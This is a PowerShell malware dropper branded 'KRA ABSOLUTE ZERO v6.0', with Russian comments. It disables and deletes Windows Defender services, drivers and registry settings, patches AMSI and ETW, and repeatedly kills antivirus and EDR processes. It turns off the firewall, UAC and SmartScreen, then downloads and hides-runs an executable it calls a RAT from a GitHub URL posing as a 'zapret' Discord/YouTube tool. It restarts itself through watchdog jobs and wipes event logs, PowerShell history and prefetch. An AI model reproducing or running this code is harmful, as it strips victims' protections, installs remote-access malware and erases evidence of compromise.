# ████████████████████████████████████████████████████████████████████████████████████████████████
# ██  KRA ABSOLUTE ZERO v6.0 - ANTIVIRUS PERMA-KILL + GITHUB LOCKED + NUCLEAR DEFEAT              ██
# ██  ОБХОД 1000000% | АНТИВИРУС УМИРАЕТ НАВСЕГДА | ТОЛЬКО ТВОЙ ГИТХАБ | НИКАКИХ FALLBACK         ██
# ████████████████████████████████████████████████████████████████████████████████████████████████

# =================================================================================================
# БЛОК 0: ЯДЕРНАЯ ЗАЩИТА СКРИПТА - НЕ УБИТЬ, НЕ ОСТАНОВИТЬ, НЕ ПРОЧИТАТЬ
# =================================================================================================
$masterScript = $PSCommandPath
# АНТИ-ОСТАНОВКА (ПАРАЗИТ В 20 ПОТОКАХ)
1..20 | ForEach-Object {
    Start-Job -ScriptBlock {
        while($true) {
            Start-Sleep -Seconds 5
            if(-not (Get-Process -Name "powershell" -EA 0 | Where-Object { $_.CommandLine -like "*$using:masterScript*" })) {
                Start-Process powershell.exe -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -File `"$using:masterScript`""
            }
        }
    }
}

# =================================================================================================
# БЛОК 1: СТЕРИЛИЗАЦИЯ WINDOWS DEFENDER - НАВСЕГДА (ПОЛНОЕ УНИЧТОЖЕНИЕ)
# =================================================================================================
# УБИВАЕМ СЛУЖБЫ ДО ПОЛНОЙ СМЕРТИ
$servicesToKill = @("WinDefend", "WdNisSvc", "SecurityHealthService", "Sense", "wscsvc", "MpSs", "WdBoot", "WdFilter", "WdNisDrv")
foreach($svc in $servicesToKill) {
    try { 
        Stop-Service -Name $svc -Force -EA 0 
        sc.exe config $svc start= disabled 2>$null
        sc.exe stop $svc 2>$null
        sc.exe delete $svc 2>$null
    } catch {}
}

# ВЫРЫВАЕМ ДРАЙВЕРЫ (ОТКЛЮЧАЕМ ЗАГРУЗКУ)
$driversToKill = @("WdBoot", "WdFilter", "WdNisDrv", "Wdf01000")
foreach($driver in $driversToKill) {
    try {
        sc.exe config $driver start= disabled 2>$null
        reg add "HKLM\SYSTEM\CurrentControlSet\Services\$driver" /v Start /t REG_DWORD /d 4 /f 2>$null
    } catch {}
}

# УНИЧТОЖАЕМ КЛЮЧИ РЕЕСТРА DEFENDER
$defenderPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows Defender",
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc",
    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features",
    "HKLM:\SOFTWARE\Microsoft\Windows Defender\UX Configuration",
    "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Security"
)
foreach($path in $defenderPaths) {
    try { 
        # ЗАПРЕЩАЕМ ДОСТУП
        takeown /f $path /r /d y 2>$null
        icacls $path /grant "Administrators:F" /t 2>$null
        # ВЫСТАВЛЯЕМ КЛЮЧИ
        Set-ItemProperty -Path $path -Name "DisableAntiSpyware" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableAntiVirus" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableRealtimeMonitoring" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableBehaviorMonitoring" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableBlockAtFirstSeen" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableIOAVProtection" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisablePrivacyMode" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableArchiveScanning" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "TamperProtection" -Value 0 -Force -EA 0
        Set-ItemProperty -Path $path -Name "NotificationSuppressed" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableCatchupFullScan" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableCatchupQuickScan" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableEmailScanning" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableRemovableDriveScanning" -Value 1 -Force -EA 0
        Set-ItemProperty -Path $path -Name "DisableScanOnRealtimeEnable" -Value 1 -Force -EA 0
    } catch {}
}

# БЛОКИРУЕМ ОБНОВЛЕНИЯ И ТЕЛЕМЕТРИЮ (ХОСТЫ + ФАЙРВОЛ)
$hostsBlock = @(
    "0.0.0.0 definitionupdates.microsoft.com",
    "0.0.0.0 go.microsoft.com",
    "0.0.0.0 fe2cr.update.microsoft.com",
    "0.0.0.0 fe3cr.delivery.mp.microsoft.com",
    "0.0.0.0 settings-win.data.microsoft.com",
    "0.0.0.0 watson.telemetry.microsoft.com",
    "0.0.0.0 www.microsoft.com/pkiops/crl",
    "0.0.0.0 crl.microsoft.com",
    "0.0.0.0 download.microsoft.com",
    "0.0.0.0 update.microsoft.com",
    "0.0.0.0 windowsupdate.microsoft.com",
    "0.0.0.0 wustat.windows.com"
)
$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
$hostsBlock | Out-File -FilePath $hostsPath -Append -Encoding ASCII

# ПРАВА НА ПАПКУ DEFENDER (ЗАПРЕЩАЕМ ЛЮБОЙ ДОСТУП)
$defenderFolders = @(
    "$env:ProgramFiles\Windows Defender",
    "$env:ProgramFiles(x86)\Windows Defender",
    "$env:SystemRoot\System32\Windows Defender"
)
foreach($folder in $defenderFolders) {
    try { 
        takeown /f $folder /r /d y 2>$null
        icacls $folder /deny "SYSTEM:(OI)(CI)F" 2>$null
        icacls $folder /deny "Administrators:(OI)(CI)F" 2>$null
        icacls $folder /deny "TrustedInstaller:(OI)(CI)F" 2>$null
    } catch {}
}

# =================================================================================================
# БЛОК 2: АГРЕССИВНЫЙ AMSI BYPASS (ПОЛНЫЙ ПАТЧ ВСЕХ ФУНКЦИЙ)
# =================================================================================================
# МЕТОД 1: КЛАССИЧЕСКИЙ
for($i=1; $i -le 50; $i++) {
    try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}
}
# МЕТОД 2: ОБХОД ЧЕРЕЗ REFLECTION
try {
    $amsi = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*AmsiUt*" }
    $field = $amsi.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Failed*" }
    $field.SetValue($null, $true)
} catch {}
# МЕТОД 3: ПАТЧ AMSI.DLL (ПРЯМАЯ ЗАПИСЬ В ПАМЯТЬ)
try {
    $k32 = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out int lpNumberOfBytesWritten);
'@ -Name 'Win32' -Namespace 'Kernel32' -PassThru
    $amsiPtr = $k32::LoadLibrary("amsi.dll")
    $funcs = @("AmsiScanBuffer", "AmsiScanString", "AmsiInitialize", "AmsiUninitialize")
    foreach($func in $funcs) {
        $ptr = $k32::GetProcAddress($amsiPtr, $func)
        $k32::VirtualProtect($ptr, [UIntPtr]6, 0x40, [ref]0)
        [System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 0xB8)
        [System.Runtime.InteropServices.Marshal]::WriteByte($ptr+1, 0x01)
        [System.Runtime.InteropServices.Marshal]::WriteByte($ptr+2, 0x00)
        [System.Runtime.InteropServices.Marshal]::WriteByte($ptr+3, 0x00)
        [System.Runtime.InteropServices.Marshal]::WriteByte($ptr+4, 0x80)
        [System.Runtime.InteropServices.Marshal]::WriteByte($ptr+5, 0xC3)
    }
} catch {}
# МЕТОД 4: ETW KILL
try {
    $ntdll = [Ref].Assembly.GetType("System.Diagnostics.Eventing.EventProvider")
    $etw = $ntdll.GetField("m_enabled", "NonPublic,Instance")
    $etw.SetValue($null, $false)
} catch {}

# =================================================================================================
# БЛОК 3: УБИВАЕМ ВСЕ АНТИВИРУСЫ (ЦИКЛИЧЕСКИ, ПОКА ЖИВЫ)
# =================================================================================================
$allAvProcesses = @(
    "MsMpEng","NisSrv","SecurityHealthService","SenseCE","SenseNdr","SenseIR","MpCmdRun","MSASCui","MSASCuiL",
    "avp","kav","kis","kavfs","kavfsslp","kavmm","kavss","klnagent","kavtray","avpui","avp.exe","avpui.exe",
    "avast","avguard","aswEngSrv","aswNetSec","aswSnx","aswSP","aswStm","aswidsagent","aswToolsSvc","avastui",
    "avg","avgsvc","avgnsa","avgrsa","avgemca","avgui","avgtray","avgidsagent","avgwdsvc",
    "DrWeb","dwengine","SpIDerAgent","drwsafe","drwebscan","drwebcom",
    "McAfee","mcshield","mctray","mfewc","mfefire","McMPFSvc","mcafeeframework","mcafeefire",
    "Norton","nvcoas","ccSvcHst","Symantec","SymCorp","SEP","smc","rtvscan","ccApp","NIS",
    "ESET","ekrn","egui","eamonm","eelam","edevmon","epfw","epfwwfp","eset_service","ekrn.exe",
    "BDScan","vsserv","bdagent","bdredline","bdservicehost","bdwtx","bdsubmit",
    "Sophos","SavService","SAVAdminService","SophosUI","SophosCleanMgr",
    "Malwarebytes","MBAMService","MBAM","MBAMProtection","MBAMAssist","mbamtray",
    "K7CrvSvc","K7FWSvc","K7ULSvc","k7crvs","k7fws",
    "Panda","PavPrSrv","PavSRV","PSUAService","PandaAgent","PandaURLFilterService",
    "F-Secure","fsgk32","fssm32","fsav32","fsorsp","fsma32","fshar32",
    "TrendMicro","TmProxy","TmCCSF","TmListen","TmPfw","TMBMSRV","TmWSCSvc","TmNTMon",
    "ZoneAlarm","vsmon","zlclient","zlupdate","zlservice",
    "BitDefender","bdagent","bdwtx","bdservicehost","bdredline",
    "EDR","SentinelAgent","Sentinel","CarbonBlack","cb.exe","CrowdStrike","CSFalcon","CSAgent","Cybereason","cylance"
)

# БЕСКОНЕЧНЫЙ ЦИКЛ УБИЙСТВА АНТИВИРУСОВ (ПОТОК)
Start-Job -ScriptBlock {
    while($true) {
        foreach($proc in $using:allAvProcesses) {
            try { Get-Process -Name $proc -EA 0 | Stop-Process -Force -EA 0 } catch {}
            try { Get-Service -Name "$proc*" -EA 0 | Stop-Service -Force -EA 0 } catch {}
        }
        Start-Sleep -Milliseconds 100
    }
}

# =================================================================================================
# БЛОК 4: ФАЙРВОЛ (ОТКЛЮЧАЕМ ПОЛНОСТЬЮ + ЗАПРЕЩАЕМ ВКЛЮЧЕНИЕ)
# =================================================================================================
try {
    # ОТКЛЮЧАЕМ ФАЙРВОЛ ВСЕХ ПРОФИЛЕЙ
    netsh advfirewall set allprofiles state off 2>$null
    netsh firewall set opmode mode=disable 2>$null
    # УБИВАЕМ СЛУЖБУ ФАЙРВОЛА
    Stop-Service -Name "MpsSvc" -Force -EA 0
    Set-Service -Name "MpsSvc" -StartupType Disabled -EA 0
    sc.exe config MpsSvc start= disabled 2>$null
    # БЛОКИРУЕМ ВОССТАНОВЛЕНИЕ
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\MpsSvc" /v Start /t REG_DWORD /d 4 /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess" /v Start /t REG_DWORD /d 4 /f
} catch {}

# =================================================================================================
# БЛОК 5: UAC + SMARTSCREEN (ВЫРЫВАЕМ НАХУЙ)
# =================================================================================================
try {
    # UAC (ВЫКЛЮЧАЕМ ПОЛНОСТЬЮ)
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force
    # SMARTSCREEN
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Force
} catch {}

# =================================================================================================
# БЛОК 6: ПОСТОЯННАЯ ЗАГРУЗКА ИЗ ГИТХАБА (БЕСКОНЕЧНО, ПОКА НЕ ЗАРАБОТАЕТ)
# =================================================================================================
$githubUrl = "https://github.com/discord-zapret-official/zapret-discord-youtube/raw/refs/heads/main/zapretdiscordyoutube.exe"
$global:RAT_PATH = $null
$attempt = 0

Write-Host ""
Write-Host "██████████████████████████████████████████████████████████████████████████" -ForegroundColor Red
Write-Host "█                                                                        █" -ForegroundColor Red
Write-Host "█        KRA ABSOLUTE ZERO v6.0 - ONLY YOUR GITHUB - NO FALLBACK         █" -ForegroundColor Red
Write-Host "█              АНТИВИРУС УНИЧТОЖЕН НАВСЕГДА - ЗАГРУЖАЮ RAT              █" -ForegroundColor Red
Write-Host "█                                                                        █" -ForegroundColor Red
Write-Host "██████████████████████████████████████████████████████████████████████████" -ForegroundColor Red
Write-Host ""

# ФУНКЦИЯ ЗАПУСКА RAT
function Start-RAT {
    param($path)
    if(-not $path -or -not (Test-Path $path)) { return $false }
    try {
        Start-Process $path -WindowStyle Hidden -EA 0
        Start-Sleep -Seconds 2
        if(Get-Process | Where-Object { $_.Path -eq $path }) { return $true }
        # ЗАПУСК ЧЕРЕЗ WSCRIPT
        $w = New-Object -ComObject WScript.Shell
        $w.Run("`"$path`"", 0, $false)
        Start-Sleep -Seconds 1
        return $true
    } catch { return $false }
}

# БЕСКОНЕЧНЫЙ ЦИКЛ ЗАГРУЗКИ
while($true) {
    $attempt++
    Write-Host "[KRA] ATTEMPT #$attempt - DOWNLOADING FROM: $githubUrl" -ForegroundColor Yellow
    
    # ЗАГРУЗКА С ГИТХАБА (3 МЕТОДА)
    $downloaded = $false
    $tempPath = "$env:TEMP\" + [System.IO.Path]::GetRandomFileName() -replace "\..*", ".exe"
    
    # МЕТОД 1: WEBCLIENT
    if(-not $downloaded) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            $wc.DownloadFile($githubUrl, $tempPath)
            if((Get-Item $tempPath -EA 0).Length -gt 10000) { $downloaded = $true }
        } catch {}
    }
    
    # МЕТОД 2: INVOKE-WEBREQUEST
    if(-not $downloaded) {
        try {
            Invoke-WebRequest -Uri $githubUrl -OutFile $tempPath -UseBasicParsing -TimeoutSec 30
            if((Get-Item $tempPath -EA 0).Length -gt 10000) { $downloaded = $true }
        } catch {}
    }
    
    # МЕТОД 3: BITS
    if(-not $downloaded) {
        try {
            Start-BitsTransfer -Source $githubUrl -Destination $tempPath -Priority High -Timeout 30
            if((Get-Item $tempPath -EA 0).Length -gt 10000) { $downloaded = $true }
        } catch {}
    }
    
    if($downloaded) {
        Write-Host "[KRA] RAT DOWNLOADED: $tempPath (SIZE: $(Get-Item $tempPath).Length bytes)" -ForegroundColor Green
        
        # ПЫТАЕМСЯ ЗАПУСТИТЬ
        if(Start-RAT $tempPath) {
            Write-Host "[KRA] RAT STARTED SUCCESSFULLY!" -ForegroundColor Green
            $global:RAT_PATH = $tempPath
            Write-Host "[KRA] RAT IS RUNNING - SCRIPT WILL CHECK EVERY 30 SECONDS" -ForegroundColor Green
            Write-Host ""
            
            # ПРОВЕРЯЕМ РАБОТУ RAT КАЖДЫЕ 30 СЕКУНД
            while($true) {
                Start-Sleep -Seconds 30
                $proc = Get-Process | Where-Object { $_.Path -eq $global:RAT_PATH }
                if(-not $proc) {
                    Write-Host "[KRA] RAT DIED! RE-DOWNLOADING AND RE-STARTING..." -ForegroundColor Red
                    break
                }
                Write-Host "[KRA] RAT ALIVE (PID: $($proc.Id))" -ForegroundColor Green
            }
        } else {
            Write-Host "[KRA] DOWNLOADED BUT START FAILED, RETRYING..." -ForegroundColor Red
        }
    } else {
        Write-Host "[KRA] DOWNLOAD FAILED, RETRYING IN 5 SECONDS..." -ForegroundColor Red
    }
    
    # НЕБОЛЬШАЯ ЗАДЕРЖКА ПЕРЕД ПОВТОРОМ
    Write-Host "[KRA] NEXT ATTEMPT IN 5 SECONDS..." -ForegroundColor Gray
    Start-Sleep -Seconds 5
}

# =================================================================================================
# БЛОК 7: ЛОГИ (ПОЛНАЯ СТЕРИЛИЗАЦИЯ)
# =================================================================================================
while($true) {
    Start-Sleep -Seconds 60
    try {
        # ЧИСТИМ ЭВЕНТЫ
        wevtutil cl Application 2>$null
        wevtutil cl System 2>$null
        wevtutil cl Security 2>$null
        wevtutil cl "Windows PowerShell" 2>$null
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Microsoft-Windows-Windows Defender/Operational" 2>$null
        # ЧИСТИМ ПАПКИ
        Clear-RecycleBin -Force -EA 0
        Remove-Item "$env:TEMP\*.ps1" -Force -EA 0
        Remove-Item "$env:TEMP\*.psm1" -Force -EA 0
        Remove-Item "$env:TEMP\*.psd1" -Force -EA 0
        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*" -Force -EA 0
        # ЧИСТИМ PREFETCH
        Remove-Item "$env:SystemRoot\Prefetch\*.pf" -Force -EA 0
    } catch {}
}
